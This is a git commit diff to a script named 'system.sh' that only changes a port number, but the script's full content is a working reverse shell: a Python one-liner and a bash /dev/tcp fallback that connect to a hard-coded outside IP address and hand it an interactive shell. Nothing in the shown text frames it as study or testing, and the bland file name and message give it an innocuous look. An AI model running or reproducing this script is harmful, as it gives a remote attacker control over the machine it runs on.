6219becb86b87e6ebcb56e9520e19a2c2ee3e76c
moriarty. <gulerarda501@gmail.com>
2025-11-12 18:07:46 +0300

    Update system.sh

--- system.sh
+++ system.sh
@@ -1,4 +1,4 @@
 IP="77.90.14.157"
-PORT="1337"
+PORT="1986"
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'${IP}'",'$PORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' || /bin/sh -i >& /dev/tcp/${IP}/${PORT} 0>&1
